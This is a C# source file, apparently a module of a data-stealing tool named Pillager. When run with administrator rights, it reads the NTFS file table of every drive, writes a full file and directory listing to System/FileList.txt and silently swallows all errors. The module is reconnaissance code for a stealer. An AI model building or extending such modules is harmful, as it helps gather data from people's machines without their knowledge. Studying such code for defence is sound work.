using Pillager.Helper;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Principal;
using System.Text;

namespace Pillager.SystemInfos
{
    internal class FileList : ICommandOnce
    {
        public override void Save(string path)
        {
            try
            {
                if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)) return;

                var allDrives = DriveInfo.GetDrives();

                StringBuilder sb = new StringBuilder();

                foreach (var driveToAnalyze in allDrives)
                {
                    try
                    {
                        NtfsReader ntfsReader = new NtfsReader(driveToAnalyze, NtfsReader.RetrieveMode.All);
                        IEnumerable<NtfsReader.INode> nodes =
                            ntfsReader.GetNodes(driveToAnalyze.Name);
                        foreach (NtfsReader.INode node in nodes)
                            sb.AppendLine(((node.Attributes & NtfsReader.Attributes.Directory) != 0 ? "Dir;" : "File;") + node.FullName);
                    }
                    catch { }
                }

                string savepath = Path.Combine(path, "System");
                string result = sb.ToString();
                if (!string.IsNullOrEmpty(result))
                {
                    Directory.CreateDirectory(savepath);
                    File.WriteAllText(Path.Combine(savepath, "FileList.txt"), result, Encoding.UTF8);
                }
            }
            catch { }
        }
    }
}
